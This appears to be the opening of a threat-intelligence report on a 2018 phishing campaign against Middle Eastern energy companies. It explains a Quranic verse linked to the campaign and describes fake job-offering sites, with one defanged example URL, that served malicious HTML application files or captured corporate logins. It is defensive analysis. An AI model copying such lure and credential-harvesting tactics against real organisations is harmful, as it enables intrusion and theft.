أَبِي لَهَبٍ وَتَبَّ.
This is a phrase from the Quran (Surah Masad, Ayat 1 [111:1]) that means “perish the hands of the Father of flame” or “the power of Abu Lahab will perish, and he will perish.”
What does this mean in the context of a cyber campaign targeting energy industries in the Middle East?
Overview of the attack How did the malware get onto the victim’s network?
We received intelligence that the adversaries had created websites closely resembling legitimate domains which carry job offerings.
For example: Hxxp://possibletarget.ddns.com:880/JobOffering.
Many of the URLs we discovered were related to the energy sector operating mostly in the Middle East.
Some of these sites contained malicious HTML application files that execute other payloads.
Other sites lured victims to login using their corporate credentials.
This preliminary attack seems to have started by the end of August 2018, according to our telemetry, to gather these credentials.
